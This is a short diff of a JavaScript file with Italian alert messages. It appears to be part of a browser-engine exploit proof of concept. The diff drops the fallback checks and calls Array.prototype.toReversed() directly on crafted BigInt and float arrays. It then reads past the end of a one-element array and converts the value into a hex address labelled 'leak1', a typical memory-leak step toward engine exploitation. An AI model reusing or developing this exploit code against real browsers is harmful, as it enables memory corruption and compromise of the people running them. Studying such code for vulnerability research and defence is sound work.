@@ -31,13 +31,8 @@
             const v1 = [-1n];
             let v2;
 
-            if (Array.prototype.toReversed) {
-                alert("Usando toReversed() per v1");
-                v2 = v1.toReversed();
-            } else {
-                alert("toReversed() non esiste! Usando reverse() per v1");
-                v2 = [...v1].reverse();
-            }
+            alert("Usando toReversed() per v1");
+            v2 = v1.toReversed(); 
 
             alert("Descrizione di v2: " + JSON.stringify(v2));
             await sleepSeconds(5);
@@ -51,13 +46,8 @@
 
             let b1 = [1.1];
 
-            if (Array.prototype.toReversed) {
-                alert("Usando toReversed() per b1");
-                b1 = b1.toReversed();
-            } else {
-                alert("toReversed() non esiste! Usando reverse() per b1");
-                b1 = [...b1].reverse();
-            }
+            alert("Usando toReversed() per b1");
+            b1 = b1.toReversed();
 
             let addr1 = f2i(b1[1]);
             alert("leak1: " + hex(addr1));
